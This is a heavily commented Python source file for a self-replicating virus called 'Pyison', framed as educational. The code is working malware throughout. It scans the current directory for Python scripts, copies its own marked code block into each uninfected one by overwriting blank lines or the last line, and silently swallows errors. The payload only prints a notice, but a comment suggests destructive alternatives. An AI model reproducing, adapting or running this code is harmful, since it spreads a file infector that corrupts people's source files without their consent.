## It is supposed to be spelled like "poison" :)
##
## Although this script is non-destructive,
## it can still be harmful. Do NOT release into
## the wild for fun and giggles. This is only and
## only for educational purposes, to show people
## with limited programming knowledge how viruses
## work.

"""VIRUS_START_POINT"""
# This line above will act as the point that indicates where the virus code starts
# when we are infecting other files from an already infected file.

import os

# Look for files in the current directory.
for filename in os.listdir():

    # Is the file a python script?
    if filename.endswith('.py'):

        # We are looking at a new file. Clear already_infected flag.
        already_infected = False

        # It is a python script!
        # Let's open the file to infect.
        try:
            file = open(filename, 'r+')

            # Read the lines in the python script.
            file_lines = file.readlines()

            # Look for consequtive empty lines in the script.
            # If there is a big enough empty space, we can inject
            # our virus code there.
            infect_line = None
            empty_line_counter = 0
            for line_index in range(len(file_lines)):
                
                line = file_lines[line_index]

                # Check whether this file already contains the virus.
                if "VIRUS_START_POINT" in line:
                    already_infected = True
                
                if line == "\n":

                    # This line is empty, and is therefore a
                    # possible start point to write our
                    # virus code. Let's take it into memory.
                    if empty_line_counter == 0:
                        empty_line_start = line_index
                        
                    empty_line_counter += 1

                else:
                    empty_line_counter = 0

                # We found 150 or more consequtive empty lines
                # within the script we want to infect. We will
                # write our code to those empty lines.
                if empty_line_counter >= 150:
                    infect_line = empty_line_start

                    # We found an infection point already.
                    # No need to keep looking through the
                    # lines. Break the loop.
                    break

            # We failed to find a space large enough within the
            # file to inject our code. So instead, we will just
            # add our code to the end.
            if not infect_line:
                infect_line = len(file_lines) - 1

            # Let's cover the edge case where the python script
            # we want to infect is empty.
            if infect_line < 0:
                infect_line = 0

            # We don't need to infect a file multiple times, do we?
            if not already_infected:
                # We have decided on our infection point. Let's write
                # our code to the victim file.

                # Let's read the virus code from this very file first.
                self_filename = os.path.basename(__file__)
                self_file = open(self_filename, "r")
                self_lines = self_file.readlines()

                self_line_index = 0
                self_virus_start = None
                # Let's get the line index where the virus code starts and ends.
                for self_line in self_lines:
                    if not self_virus_start and "VIRUS_START_POINT" in self_line:
                        self_virus_start = self_line_index

                    elif "VIRUS_END_POINT" in self_line:
                        self_virus_end = self_line_index
                        
                    self_line_index += 1

                # Now, replace the lines we chose to infect, or append to the end
                # of the file!
                write_line_index = self_virus_start
                write_index = infect_line
                while write_line_index <= self_virus_end:
                    if write_index >= len(file_lines):
                        file_lines.append(self_lines[write_line_index])
                    else:
                        file_lines[write_index] = self_lines[write_line_index]
                    write_index += 1
                    write_line_index += 1

                # Close the victim file and open in overwrite mode, where we write the
                # infected lines.
                file.close()
                file = open(filename, 'w')
                file.writelines(file_lines)

                # We are done here. Close the file.
                file.close()

        except:
            # We can't open or infect this file.
            # Let's silently pass.
            pass

# This is the virus payload. In this case, it lets us know that the virus is present in
# a particular python file. If we were evil people, we could instead make it delete
# important documents or install Google products.
print('THIS FILE HAS BEEN INFECTED BY PYISON! Now you probably also infected any other python file in this directory.')

# This line below will act as the point that indicates where the virus code ends
# when we are infecting other files from an already infected file.
"""VIRUS_END_POINT"""
